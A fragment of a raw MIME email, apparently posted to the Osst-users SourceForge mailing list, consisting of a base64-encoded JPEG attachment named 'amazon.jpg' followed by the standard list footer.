--=====003_Dragon566062704175_=====
Content-Type: image/jpeg;
	name="amazon.jpg"
Content-Transfer-Encoding: base64
Content-ID: <0003E83821B5_05918536_03DA3D5F>

/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsK
CwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQU
FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAAwAHQDASIA
AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA
AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3
ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWm
p6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEA
AwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSEx
BhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElK
U1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3
uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD4ioor
qPh38K/Ffxa1ibS/CHh698Q3kaK83lx/6j/rq9e1KUY/EeZGMjl6K9K+KH7NfxK+Dun/ANo+LvCV
7pGn/wDP55iXMP8A33DurF0/4P8AjXVvBf8Awldl4V1S+8P/AGjZ/aFvab03s/lVPNHl5rhyyOPo
r0Lx5+zv8SPhnHpT+JfB+qaZ/bDrBZf8tvPuG+5F+7/5atR8RPgB8RfhDpdvqnivwrqGh6fdfu0u
JP8A0B9tHNHuPlkee0V3Xwr+A/j340SXP/CG+GL3XI4H2TXEf7m2R/7jPJR8UPgf46+DElsnjLwx
e6HHO/lwySfvoX/3Xjo5o8xXLI4WivVfCf7LnxX8beH7DWtE8Danqej3yeZbXFYPxI+CHjr4Qx2c
/jHw3e6HHdO0drJcfxvRzR7kcsjiKK9X8N/so/Frxj4U/wCEj0jwDq1zpGzzEGxEef8A3IW21wvh
fwH4g8Y+LE8MaRol1qXiDfLB/Zccf77en3/++aPaR7j5ZGFRXqXhz9lz4q+MLjWINI8D6nc3Glv9
kuY/kh2TV5leWdxY3k1rdQvbXkDtBNbyR7HgdfldGRqIyiHvEVFFFWIK+0f2ONU+MurfCPxN4Y+H
Wm+H/D2j/aJRN401WR4Xhr4ur9A/2ZviB8PviX+xvrXwZ1zxXa+CdUH2iCS4kkTPz3HmpcD8cVz4
g2pnq2l2GoP+wt8SbDxP8RtJ+Lt/a2WobtcsroXyHg4BPtXMfsz+ONQ+G/8AwTn17xLpHl/2xpX2
6e2/66+dWR8LfiZ+z38HP2dfGvwij8d3OsWSabO+oapsx/aEt0m1/svrXA/Dv4yeDNJ/4J1+JPBt
74q0uLxROl1s0vzP33zXNcMf5ZHRL+Y968D/ALQ3ijVf2CdT+Jmqtb6j4x0kTiG7kt02faI5tglx
WFrHjXU/i7/wTP1vxN4tcajq9xb5lnx1MWojB/SvHvAnxg8F6b/wTq8TeDbrxTpkfiuRrjZpH2j/
AEn5rkVp+E/jJ4F03/gm7qvgyfxTpkXiuRJ/+JRJef6T82o0cocw74F3Xxu8Wfsx2WjeGpfDfww8
G2oz/wAJle3j2kjj1r1L9paG41P/AIJ1G41fxNYfEDULd7N/+Eksx5sd2/24L5w/OuPh8VfDH9p7
9ifw38OtT+Ilj4Hu9CgsUvTeEfK9uB6mqnxF+M3wMf8AYs1r4U+HPFV5dR6RAdI0zaMXOoXEX78X
H/XBpqI35w90zv8Agnhqnxd8f6xZp/wlmoWXw08Mf8u/lpsuv7lvUXjz4uaf+2B+2X4E8IweXe+A
9H1JvJ/uapsTdNXYfCv9rT4K+AfgHoXw8TRPEHjPzNDgTXbPQdFeb97LD/pHm7tteLePPiR8EPh5
4w8CfEH4Oaff6R4i0fWf+Jt4bvftFvm37/66svbQlUcY7msqNWMVKS07nrn7UP7UPjnwD+394A8H
aTqtzbeE2n0qK70xfuXX2iXBr03xd4C0/wAMf8FKPh5q9giqfEGjX0t53zLHDPg1x3jnw98CPj/8
avCfx9f4lWWm23h0wSXOn3BRfMaE74q8/wBB/a08MfEL9vLw54xudRj0LwNo+m3VlbXGo/uetvk1
cYyI5onsVj8fvFA/4KHt8LDc2tt4JHmx/wBmeRy839nPd+bXxf8At6WaWP7WnxC/37WT/wAlI2r1
rS/i34Mj/wCClz+OP+En0/8A4RP9/wD8TTzP9G/5BdeJftp+MNE8dftMeL9e0HUrXV9Huvsey8sv
+vaNa6KO5z1Jc0TxKiiivQOcKKKKAHRyNbSJOn7qSOvSdHvPBnxE/ceIX/4RDxB/0GLK3/4l8/8A
13t/4H/3PLSvNKK8zGYP6xHmi+WS2aPQweL9i/eV090eta5+zH4zsY/tWkJZeJtPk+5cadcJ/wCz
ba4q8+Gfi3TZNk/hXWov+3CbZVTw3448QeDbjfomsXumf9M45Pkf/eSvSNL/AGsPHumx/v5tP1P/
AK+LT/43tr5qp/buE+HlqLu9Ge9H+ycR8V4PtuedR+A/FEv3PDerSSf9M7CZ66jQ/wBnv4ga/Imz
w9PYx/8APTUZPJ/9Crpbz9rzx3cx/JDpFj/172n/AMU9ef8Aij4qeMPGUbwav4hvbm3k+/b+Zsh/
74WinLPcR8UYwXfciUcpoe9F83lsenfbNb8E2eleENI+Iv8AafiSSWK1tbPQY0+zQOz/APLe4rjP
j54wt/G3xQ1W9sv3tnBtsUkj/j2V55HJLbSedBM8Un/PSOTZTa9HCZS8PXVeo7vvbds5MVmv1ij7
KKsgooor6Y8AKKKKBBRRRTA//9k=

--=====003_Dragon566062704175_=====--



--===============7776425837352149571==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7776425837352149571==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============7776425837352149571==--


